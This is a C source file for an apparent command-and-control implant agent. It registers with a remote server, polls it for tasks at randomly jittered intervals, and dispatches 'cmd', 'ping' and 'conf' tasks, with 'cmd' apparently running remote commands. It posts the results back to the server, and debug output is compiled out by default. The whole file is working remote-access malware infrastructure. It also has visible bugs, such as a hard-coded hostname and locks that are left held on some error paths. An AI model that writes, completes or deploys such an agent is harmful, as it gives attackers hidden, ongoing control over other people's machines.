#include "config.h"
#include "task-handlers.h"

#include "curl/curl.h"
#include "jansson.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>

//could add a log buffer that is returned to the server with log task

char *agent_id;
struct {
    struct timespec mean_delay;
    struct timespec jitter; //max jitter
} beacon_config = {
    .mean_delay = {.tv_sec = DEFAULT_DELAY_S, .tv_nsec = DEFAULT_DELAY_NS},
    .jitter = {.tv_sec = DEFAULT_JITTER_S, .tv_nsec = DEFAULT_JITTER_NS}
};

//misc
struct response_buf {
    char *response;
    size_t size;
};

json_t *tasks;
pthread_mutex_t tasks_mutex, conf_mutex; //or make conf a packed atomic uint16?
pthread_cond_t got_task_cond;

char *agent_init(void);
void *beacon_routine(void *);
void *task_routine(void *);
int set_http_headers(struct curl_slist **slist_ptr, int argc, ...);
size_t write_cb(char *data, size_t size, size_t nmemb, void *buf);
struct timespec compute_sleep_time(struct timespec mean_delay, struct timespec jitter);

int main(void){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    srand((unsigned)time(NULL));

    int rc;
    agent_id = agent_init(); //free it
    if (!agent_id) {
#ifdef DEBUG
        fprintf(stderr, "\nerror: agent_init\n");
#endif
        return 1;
    }
    printf("%s\n", agent_id);

    tasks = json_array();
    if (!tasks) {
#ifdef DEBUG
        fprintf(stderr, "error: jansson\n");
        return 1;
#endif
    }

    pthread_mutex_init(&tasks_mutex, NULL);
    pthread_mutex_init(&conf_mutex, NULL);
    pthread_cond_init(&got_task_cond, NULL);
    pthread_t beacon_th, task_th;
    rc = pthread_create(&beacon_th, NULL, beacon_routine, NULL);
    if (rc) {
#ifdef DEBUG
        fprintf(stderr, "pthread_create: %s", strerror(rc));
#endif
        return 1;
    }
    rc = pthread_create(&task_th, NULL, task_routine, NULL);
    if (rc) {
#ifdef DEBUG
        fprintf(stderr, "pthread_create: %s", strerror(rc));
#endif
        //join / cancel the other one?
        return 1;
    }
    pthread_join(beacon_th, NULL);
    pthread_join(task_th, NULL);

    pthread_mutex_destroy(&tasks_mutex);
    pthread_mutex_destroy(&conf_mutex);
    pthread_cond_destroy(&got_task_cond);
    return 0;
}

char *agent_init(void) {
    int rc;
    CURLcode rc_curl;
    char hostname[HOST_NAME_MAX + 1];
    if (gethostname(hostname, HOST_NAME_MAX)) {
#ifdef DEBUG
        perror("gethostname");
#endif
        hostname[0] = '\0';
        //return NULL;
    }
    json_t *post_json = json_pack("{s:s, s:s}", "handle", AGENT_HANDLE, "hostname", "myhostname");
    char *post_str = json_dumps(post_json, 0);
    json_decref(post_json);
    if (!post_str) {
#ifdef DEBUG
        fprintf(stderr, "json dumps failed.\n");
#endif
        return NULL;
    }
    //setting up curl to submit agent data
    CURL *curl = curl_easy_init();
    if (!curl) {
        free(post_str);
        return NULL;
    }
    struct response_buf response_buf = {0};

    curl_easy_setopt(curl, CURLOPT_URL, AGENTS_URL);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_str);
    struct curl_slist *headers = NULL;
    rc = set_http_headers(&headers, 1, "Content-Type: application/json");
    if (!rc) {
        free(post_str);
        curl_easy_cleanup(curl);
        return NULL;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
    rc_curl = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    free(post_str);
    if (rc_curl != CURLE_OK) {
#ifdef DEBUG
        fprintf(stderr, "curl_easy_perform: %s", curl_easy_strerror(rc_curl));
#endif
        curl_easy_cleanup(curl);
        return NULL;
    }
    curl_easy_cleanup(curl);
    //fwrite(response_buf.response, 1, response_buf.size, stdout);
    //parsing response (uuid) into json
    json_error_t jerror;
    json_t *root = json_loadb(response_buf.response, response_buf.size, 0, &jerror);
    if (!root)
    {
#ifdef DEBUG
        fprintf(stderr, "syntax error in json message: line %d, error %s\n", jerror.line, jerror.text);
#endif
        return NULL;
    }
    if (!json_is_object(root)) {
#ifdef DEBUG
        fprintf(stderr, "error: bad json data\n");
#endif
        json_decref(root);
        return NULL;
    }
    json_t *uuid_json = json_object_get(root, "uuid");
    if (!json_is_string(uuid_json)) {
#ifdef DEBUG
        fprintf(stderr, "error: bad json data\n");
#endif
        json_decref(root);
        return NULL;
    }
    char *uuid_str = strdup(json_string_value(uuid_json));
    if (!uuid_str) {
#ifdef DEBUG
        perror("malloc");
#endif
        json_decref(root);
        return NULL;
    }
    return uuid_str;
}

void *beacon_routine(void *) {
    int rc;
    CURLcode rc_curl;

    char *full_url = malloc(strlen(TASKS_URL "?id=") + UUID_STR_SIZE);
    if (!full_url) {
#ifdef DEBUG
        perror("malloc");
#endif
        return NULL;
    }
    sprintf(full_url, TASKS_URL "?id=%s", agent_id);
    //int fails = 0; //reset on each success
    while (1) {
        pthread_mutex_lock(&conf_mutex);
        struct timespec t = compute_sleep_time(beacon_config.mean_delay, beacon_config.jitter);
#ifdef DEBUG
        printf("\nnap %llds %lldns\n", (long long)t.tv_sec, (long long)t.tv_nsec);
#endif
        clock_nanosleep(CLOCK_MONOTONIC, 0, &t, NULL);
        pthread_mutex_unlock(&conf_mutex);
        //get_task
        CURL *curl = curl_easy_init();
        if (!curl) {
            return NULL;
        }
        struct response_buf response_buf = {0};
        curl_easy_setopt(curl, CURLOPT_URL, full_url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
        rc_curl = curl_easy_perform(curl);
        if (rc_curl != CURLE_OK) {
#ifdef DEBUG
            fprintf(stderr, "curl_easy_perform: %s", curl_easy_strerror(rc_curl));
#endif
            curl_easy_cleanup(curl);
            free(full_url); //
            //fails++;
            return NULL;
            //continue;
        }
        curl_easy_cleanup(curl);
#ifdef DEBUG
        fwrite(response_buf.response, 1, response_buf.size, stdout);
        printf("\n");
#endif
        //parsing response (task array) into json
        json_error_t jerror;
        json_t *root = json_loadb(response_buf.response, response_buf.size, 0, &jerror);
        if (!root)
        {
#ifdef DEBUG
            fprintf(stderr, "syntax error in json message: line %d, error %s\n", jerror.line, jerror.text);
#endif
            free(full_url);
            return NULL;
        }
        if (!json_is_array(root)) {
#ifdef DEBUG
            fprintf(stderr, "error: bad json data\n");
#endif
            json_decref(root);
            return NULL;
        }
        //append new tasks to tasks array
        pthread_mutex_lock(&tasks_mutex);
        rc = json_array_extend(tasks, root);
        if (rc) {
#ifdef DEBUG
            fprintf(stderr, "error: json_array_extend\n");
#endif
            return NULL;
        }
        if (json_array_size(root) != 0) {
            pthread_cond_signal(&got_task_cond);
        }
        json_decref(root);
        pthread_mutex_unlock(&tasks_mutex);

    } //endloop
    //may add a shutdown task that will cause a break in this loop
    //free(full_url);
}

void *task_routine(void *) {
    int rc;
    CURLcode rc_curl;
    while (1) {
        //pop task from array (FIFO)
        pthread_mutex_lock(&tasks_mutex);
        while (json_array_size(tasks) == 0) {
            //no tasks, waiting
            pthread_cond_wait(&got_task_cond, &tasks_mutex);
        }
        json_t *cur_task = json_array_get(tasks, 0);
        cur_task = json_incref(cur_task);
        json_array_remove(tasks, 0);
        pthread_mutex_unlock(&tasks_mutex);
        //got new task. unpacking it
        char *category = NULL; //lifetime until task exists
        char *task_id = NULL;
        char *options_str = NULL;
        rc = json_unpack(cur_task, "{s:s, s:s, s:s}",
            "category", &category, "uuid", &task_id, "options", &options_str);
        if (rc) {
#ifdef DEBUG
            fprintf(stderr, "error: json unpack.\n");
#endif
            json_decref(cur_task);
            //continue; //this would skip that task
            //return NULL;
            exit(EXIT_FAILURE);
        }
        json_error_t error;
        json_t *options = json_loads(options_str, 0, &error);
        if (!json_is_object(options)) {
#ifdef DEBUG
            fprintf(stderr, "options should be an object\n");
#endif
            //continue; //this would skip that task
            //return NULL;
            exit(EXIT_FAILURE);
        }
        //tasks return json_t object "result", returns null on any error
        //must be decref'd if not null
        json_t *result = NULL;
        if (strcasecmp(category, "ping") == 0) {
            result = task_ping(options);
        }
        else if (strcasecmp(category, "cmd") == 0) {
            result = task_cmd(options);
        }
        else if (strcasecmp(category, "conf") == 0) {
            result = task_conf(options);
        }
        else { //no match
            result = json_pack("s:s", "error", "unsupported task category");
        }
        json_decref(options);
        if (!result) {
            result = json_pack("s:s", "error", "task servicing error");
            if (!result) {
                result = json_object(); //empty
                if (!result) {
                    //continue
                    json_decref(cur_task);
                    exit(EXIT_FAILURE);
                }
            }
        } //result is surely a json object if we get to this point
        //submitting to /results
        json_t *post_json = json_pack("{s:s, s:s, s:o}",
            "agent_id", agent_id, "task_id", task_id, "result", result);
        //json_pack steals the reference to result, so it's freed here
        json_decref(cur_task); //don't need category and task_id anymore

        char *post_str = json_dumps(post_json, 0);
        json_decref(post_json);
        if (!post_str) {
#ifdef DEBUG
            fprintf(stderr, "error: json dumps failed.\n");
#endif
            //continue
            exit(EXIT_FAILURE);
        }
        CURL *curl = curl_easy_init();
        if (!curl) {
#ifdef DEBUG
            fprintf(stderr, "error: curl_easy_init.\n");
#endif
            free(post_str);
            exit(EXIT_FAILURE);
        }
        struct response_buf response_buf = {0};

        curl_easy_setopt(curl, CURLOPT_URL, RESULTS_URL);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_str);
        struct curl_slist *headers = NULL;
        rc = set_http_headers(&headers, 1, "Content-Type: application/json");
        if (!rc) {
#ifdef DEBUG
            fprintf(stderr, "error: set_http_headers.\n");
#endif
            free(post_str);
            curl_easy_cleanup(curl);
            exit(EXIT_FAILURE);
        }
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
        rc_curl = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        free(post_str);
        if (rc_curl != CURLE_OK) {
#ifdef DEBUG
            fprintf(stderr, "curl_easy_perform: %s", curl_easy_strerror(rc_curl));
#endif
            curl_easy_cleanup(curl);
            exit(EXIT_FAILURE);
        }
        curl_easy_cleanup(curl);
        fwrite(response_buf.response, 1, response_buf.size, stdout);
    } //endloop

}

int set_http_headers(struct curl_slist **slist_ptr, int argc, ...) {
    struct curl_slist *headers = *slist_ptr;
    va_list args;
    va_start(args, argc);
    for (int i = 0; i < argc; i++) {
        const char *str = va_arg(args, const char *);
        struct curl_slist *temp = NULL;
        temp = curl_slist_append(headers, str);
        if (!temp) {
            curl_slist_free_all(headers);
            va_end(args);
            return 0;
        }
        headers = temp;
    }
    va_end(args);
    *slist_ptr = headers;
    return 1; //success
}

size_t write_cb(char *data, size_t size, size_t nmemb, void *buf) {
    size_t realsize = size * nmemb;
    struct response_buf *mem = (struct response_buf *)buf;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    if(!ptr)
        return 0;  //out of memory

    mem->response = ptr;
    memcpy(&(mem->response[mem->size]), data, realsize);
    mem->size += realsize;
    mem->response[mem->size] = 0;

    return realsize;
}

//sleep time calculation helpers
static int64_t timespec_to_ns(struct timespec t) {
    return (int64_t)t.tv_sec * 1000000000LL + t.tv_nsec;
}

static struct timespec ns_to_timespec(int64_t ns) {
    struct timespec t;
    t.tv_sec  = ns / 1000000000LL;
    t.tv_nsec = ns % 1000000000LL;
    if (t.tv_nsec < 0) {
        t.tv_nsec += 1000000000LL;
        t.tv_sec  -= 1;
    }
    return t;
}

struct timespec compute_sleep_time(struct timespec mean_delay, struct timespec jitter) {
    int64_t mean_ns   = timespec_to_ns(mean_delay);
    int64_t jitter_ns = timespec_to_ns(jitter);
    if (jitter_ns == 0)
        return mean_delay;
    //random num between -jitter_ns and +jitter_ns
    int64_t final_jitter = (rand() % (2 * jitter_ns + 1)) - jitter_ns;

    int64_t final_ns = mean_ns + final_jitter;
    if (final_ns < 0) final_ns = 0; //avoiding negative sleep

    return ns_to_timespec(final_ns);
}
